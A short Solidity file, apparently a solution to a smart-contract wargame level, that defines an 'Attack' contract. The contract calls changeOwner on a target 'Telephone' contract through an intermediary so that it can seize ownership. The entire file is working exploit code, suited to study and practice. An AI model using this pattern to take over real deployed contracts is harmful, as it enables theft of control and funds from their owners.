// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;



interface Telephone{// 这个方法ok
     function changeOwner(address _owner) external;
}

contract Attack {

    Telephone tel;
    
    function init(address add) public {
        tel=Telephone(add);
    }
  

    function attackGO(address _owner) public {
    
        tel.changeOwner(_owner);
    }
}